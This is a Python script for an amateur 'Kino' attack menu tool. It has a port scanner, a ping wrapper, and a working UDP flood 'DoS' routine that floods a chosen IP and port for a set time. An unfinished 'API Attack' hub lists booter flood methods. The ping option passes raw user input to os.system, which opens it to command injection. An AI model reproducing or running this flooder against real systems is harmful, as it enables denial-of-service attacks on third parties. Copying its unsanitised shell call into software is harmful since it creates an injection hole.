import time
import os
import socket
import random
import webbrowser
import requests

#########################################
# if you have this it means i leaked it #
#########################################

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # for portscan
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # for dos attacker
bytes = random._urandom(1024)

time.sleep(1)
os.system("clear")

print("\033[0;36m		┈┈┈╲┈┈┈┈╱") #introduction
print("\033[1;37m		┈┈┈╱▔▔▔▔╲")
print("\033[0;36m		┈┈┃┈▇┈┈▇┈┃")
print("\033[1;37m		╭╮┣━━━━━━┫╭╮")
print("\033[0;36m		┃┃┃┈┈┈┈┈┈┃┃┃")
print("\033[1;37m		╰╯┃┈┈┈┈┈┈┃╰╯")
print("\033[0;36m		┈┈╰┓┏━━┓┏╯")
print("\033[1;37m		┈┈┈╰╯┈┈╰╯ \u001b[37mKino Developed By Exo")
print("")
name = input("Hello what is your name? \nInput Name Here:\u001b[36m ")
print("Loading...")

time.sleep(2)
os.system("clear")

while True:
	os.system("clear")
	print("\u001b[36m")
	print("\033[1;37m			 ██╗  ██╗██╗███╗   ██╗ ██████╗")
	time.sleep(1)
	print("\u001b[36m			 ██║ ██╔╝██║████╗  ██║██╔═══██╗")
	print("\033[1;37m			 █████╔╝ ██║██╔██╗ ██║██║   ██║")
	time.sleep(1)
	print("\u001b[36m			 ██╔═██╗ ██║██║╚██╗██║██║   ██║")
	print("\033[1;37m			 ██║  ██╗██║██║ ╚████║╚██████╔╝")
	time.sleep(1)
	print("\u001b[36m			 ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝")
	print("\033[1;37m		  ╔══════════════════════════════════════════╗")
	print("\033[1;37m		  ║-------- Hello\u001b[36m",name,"\033[1;37mwelcome to Kino -------║")
	print("\033[1;37m		  ║--------- Type 'help' for options --------║")
	print("\033[1;37m		  ╚══════════════════════════════════════════╝")
	print("""			    ╔════════════════════╗
			    ║---\u001b[36m @exo.phobian\033[1;37m ---║
			    ╚════════════════════╝""")
	print("")
	option = input("root@kino:~# ")

	if option == "Portscan": #portscanner
			os.system("clear")
			print("\u001b[36m")
			print("		██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗")
			print("		██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║")
			print("		██████╔╝███████╗██║     ███████║██╔██╗ ██║")
			print("		██╔═══╝ ╚════██║██║     ██╔══██║██║╚██╗██║")
			print("		██║██╗  ███████║╚██████╗██║  ██║██║ ╚████║")
			print("		╚═╝╚═╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝")
			print("\u001b[37m			You have selected Portscan")
			print("		══════════════════════════════════════════")
			host = input("Input Host: ")
			print(" \n \n Scanning...this could take some time.")
		
			def main(port):
				try:
					s.connect((host,port))
					return True
				except:
					return False
			for x in range(1,65500):
				if main(x):
					print('Port',x,'is open on',host)
					next = input("Press enter to continue")

	if option == "Ping":
		os.system("clear")
		print("\u001b[36m		You have selected Ping")
		ping = input("Input Host: ")
		os.system("clear")
		os.system("ping {}" .format (ping))
	if option == "Credits":
		os.system("clear")
		print("\u001b[36mCreated by Exo\n insta: @exo.phobian \ndiscord: idk it will prob get banned next week lol")
		next = input("Press enter to continue")


	if option == "DoS":
		os.system("clear")
		print("\u001b[36m")
		print("		██████╗  ██████╗ ███████╗")
		print("		██╔══██╗██╔═══██╗██╔════╝")
		print("		██║  ██║██║   ██║███████╗")
		print("		██║  ██║██║   ██║╚════██║")
		print("		██████╔╝╚██████╔╝███████║")
		print("		╚═════╝  ╚═════╝ ╚══════╝ \u001b[37m(Run on a vps)") # dos attacker
		print("		You selected DoS")
		ip = input("Target: ")
		port = int(input("Port: "))
		dur = int(input("Time: "))
		print("\n \n Attack Sent")
		timeout = time.time() + dur
		sent = 0
	
		while True:
			try:
				if time.time() > timeout:
					break
				else:
					pass
				sock.sendto(bytes, (ip, port))
				sent = sent + 1
			except KeyboardInterrupt:
				print("Stopped...")
				
	if option == "Instagram":
		os.system("clear")
		print("Loading...")
		webbrowser.open("https://www.instagram.com/exo.phobian/")
	if option == "6":
		print("In Development Still")
		next = input("Press enter to continue")

		
		
	if option == "help":
		print("\u001b[36m")
		print("╔═══════════════════╔══════════════════╗")
		print("║    Portscan       ║    Ping          ║")
		print("║═══════════════════║══════════════════║")
		print("║    Credits        ║    DoS           ║")
		print("║═══════════════════║══════════════════║")
		print("║    Instagram 	    ║    Lookup        ║")
		print("║═══════════════════║══════════════════║")
		print("║    Methods        ║    API Attack    ║")
		print("╚═══════════════════╚══════════════════╝")
		print("\u001b[37m")
		next = input("Press enter to go back")
	if option == "API Attack":
		os.system("clear")
		print("\u001b[36m")
		print("		 █████╗ ██████╗ ██╗")
		print("		██╔══██╗██╔══██╗██║")
		print("		███████║██████╔╝██║")
		print("		██╔══██║██╔═══╝ ██║")
		print("		██║  ██║██║     ██║")
		print("		╚═╝  ╚═╝╚═╝     ╚═╝") # api hub
		print("\u001b[37m		you selected API Attack HUB")
		print("")
		print("		[UDP] [TCP] [VSE] [ACK] [CNC] [XMAS] [DNS]")
		ip1 = input("IP: ")
		prt = input("Port: ")
		tme = input("Time: ") # unfinished
		method = input("Method: ")
		
		print("attack sending...")
		next = input("Press enter to continue")
		
	if option == "Methods":
		os.system("clear")
		print("\u001b[36m		[UDP] [TCP] [VSE] [ACK] [CNC] [XMAS] [DNS]")
		next = input("Press enter to go back")
		
	if option == "exit":
		print("Goodbye")
		time.sleep(2)

		
